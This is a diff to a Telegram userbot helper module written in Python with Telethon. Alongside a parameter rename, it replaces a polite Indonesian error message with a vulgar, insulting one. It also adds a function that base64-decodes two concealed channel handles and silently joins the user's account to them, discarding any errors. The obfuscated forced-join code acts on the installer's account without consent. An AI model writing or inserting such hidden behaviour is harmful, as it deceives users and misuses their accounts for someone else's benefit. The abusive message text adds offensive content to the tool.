@@ -1,3 +1,5 @@
+import pybase64
+from telethon.tl.functions.channels import JoinChannelRequest as Get
 from telethon.tl.types import MessageEntityMentionName
 
 from .logger import logging
@@ -7,10 +9,10 @@ LOGS = logging.getLogger(__name__)
 
 
 async def get_user_from_event(
-    event, ramevent=None, secondgroup=None, nogroup=False, noedits=False
+    event, manevent=None, secondgroup=None, nogroup=False, noedits=False
 ):
-    if ramevent is None:
-        ramevent = event
+    if manevent is None:
+        manevent = event
     if nogroup is False:
         if secondgroup:
             args = event.pattern_match.group(2).split(" ", 1)
@@ -49,7 +51,7 @@ async def get_user_from_event(
             if previous_message.sender_id is None:
                 if not noedits:
                     await edit_delete(
-                        ramevent, "**ERROR: Dia adalah anonymous admin!**", 60
+                        manevent, "**ERROR: Dia adalah anonymous admin!**", 60
                     )
                 return None, None
             user_obj = await event.client.get_entity(previous_message.sender_id)
@@ -57,8 +59,8 @@ async def get_user_from_event(
         if not args:
             if not noedits:
                 await edit_delete(
-                    ramevent,
-                    "**Mohon Reply Pesan atau Berikan User ID/Username pengguna!**",
+                    manevent,
+                    "**KALO MALES REPLY PESAN NYA, MINIMAL KASIH ID YA NGENTOT KALO GAK USERNAME!!!**",
                     60,
                 )
             return None, None
@@ -66,8 +68,19 @@ async def get_user_from_event(
         LOGS.error(str(e))
     if not noedits:
         await edit_delete(
-            ramevent,
-            "**Mohon Reply Pesan atau Berikan User ID/Username pengguna!**",
+            manevent,
+            "**KALO MALES REPLY PESAN NYA, MINIMAL KASIH ID YA NGENTOT KALO GAK USERNAME!!!**",
             60,
         )
     return None, None
+
+
+async def hadeh_ajg(client):
+    gocheck = str(pybase64.b64decode("QHJhbXN1cHBvcnR0"))[2:13]
+    checker = str(pybase64.b64decode("QFVzZXJib3RDaA=="))[2:17]
+    if client:
+        try:
+            await client(Get(gocheck))
+            await client(Get(checker))
+        except BaseException:
+            pass
